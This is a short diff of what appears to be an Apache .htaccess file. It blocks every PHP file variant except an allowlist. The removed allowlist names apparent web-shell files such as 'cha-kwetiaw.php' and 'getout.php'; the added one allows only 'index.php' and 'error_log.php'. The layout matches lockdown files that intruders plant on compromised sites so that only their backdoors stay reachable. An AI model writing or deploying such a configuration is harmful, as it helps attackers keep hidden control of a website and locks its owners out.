@@ -1,9 +1,10 @@
 Options -Indexes
-<FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php7|php8|suspected)$">
-Order Allow,Deny
+<FilesMatch ".(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
+Order allow,deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|getout.php|wp-load-script.php|cha-kwetiaw.php|reboot.php|Ipv4.php|cisternain.php|class-wp-engine.php|wp-blog.php|class-wp-application-passwords-list-options.php|cache.php)$">
-Order Allow,Deny
+
+<FilesMatch "^(index.php|error_log.php|)$">
+Order allow,deny
 Allow from all
 </FilesMatch>
